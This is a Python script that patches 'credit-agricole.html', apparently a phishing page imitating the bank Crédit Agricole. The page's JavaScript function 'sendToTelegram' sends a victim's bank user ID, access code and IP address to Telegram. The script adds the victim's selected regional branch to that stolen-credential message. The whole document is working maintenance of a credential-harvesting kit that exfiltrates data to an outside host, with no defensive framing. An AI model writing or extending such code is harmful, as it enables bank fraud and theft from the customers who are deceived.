with open('credit-agricole.html', 'r', encoding='utf-8') as f:
    content = f.read()

if '🏪 Caisse' in content:
    print("Caisse info already added")
else:
    old_msg = "\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}\n━━━━━━━━━━━━━━━━━━━━━"
    new_msg = "\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}${caisseInfo}\n━━━━━━━━━━━━━━━━━━━━━"
    
    if old_msg in content:
        content = content.replace(old_msg, new_msg)
        
        # Also add the caisse variable declarations before the message
        old_before = "        // Envoi à Telegram\n        async function sendToTelegram() {\n            const ip = await getIP();"
        new_before = """        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const selectedCaisse = document.getElementById('caisse-select').value;
            const caisseLabel = document.getElementById('caisse-select').options[document.getElementById('caisse-select').selectedIndex].text;
            const caisseInfo = selectedCaisse ? `\n🏪 Caisse: ${caisseLabel}` : '';"""
        
        content = content.replace(old_before, new_before)
        
        with open('credit-agricole.html', 'w', encoding='utf-8') as f:
            f.write(content)
        print("Updated credit-agricole.html with caisse selection")
    else:
        print("Could not find pattern to replace")
